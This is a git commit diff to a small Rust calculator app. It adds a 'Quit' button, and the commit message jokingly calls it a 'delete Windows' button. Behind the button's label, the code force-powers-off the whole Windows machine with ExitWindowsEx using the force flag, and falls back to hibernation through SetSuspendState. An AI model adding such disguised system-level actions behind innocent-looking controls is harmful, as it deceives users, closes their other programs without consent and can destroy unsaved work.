95065209306b542f9234a5c4644b0514f758e94f
caaainnn <tellthemjesse@proton.me>
2025-12-29 18:58:46 +0300

    кнопка УДАЛИТЬ ВИНДОУС

--- src/main.rs
+++ src/main.rs
@@ -1,6 +1,9 @@
 use iced::{Alignment, Element, Fill};
 use iced::widget::{button, column, container, text, text_input};
 use meval::eval_str;
+use winapi::shared::ntdef::{FALSE, TRUE};
+use winapi::um::winuser::{ExitWindowsEx, EWX_POWEROFF, EWX_FORCE};
+use winapi::um::powrprof::SetSuspendState;
 
 pub fn main() -> iced::Result {
     iced::run(Calculator::update, Calculator::view)
@@ -10,6 +13,7 @@ pub fn main() -> iced::Result {
 enum Message {
     InputChanged(String),
     Evaluate,
+    Quit,
 }
 
 #[derive(Debug, Clone, Default)]
@@ -36,6 +40,17 @@ impl Calculator {
                 self.result = eval_str(self.expression.clone())
                     .unwrap_or(f64::NAN)
                     .to_string()
+            }, 
+            Message::Quit => {
+                let _ = iced::exit::<Calculator>();
+                
+                #[cfg(windows)]
+                unsafe {
+                    let status = ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
+                    if status == 0 {
+                        let _ = SetSuspendState(FALSE, TRUE, TRUE);
+                    }
+                }
             }
         }
     }
@@ -48,8 +63,12 @@ impl Calculator {
                 button("Evaluate")
                     .on_press(Message::Evaluate),
                 text(self.result.trim()),
+                button("Quit")
+                    .on_press(Message::Quit),
             ]
-                .align_x(Alignment::Center),
+                .align_x(Alignment::Center)
+                .spacing(5),
+                
         )
             .center(Fill)
             .into()
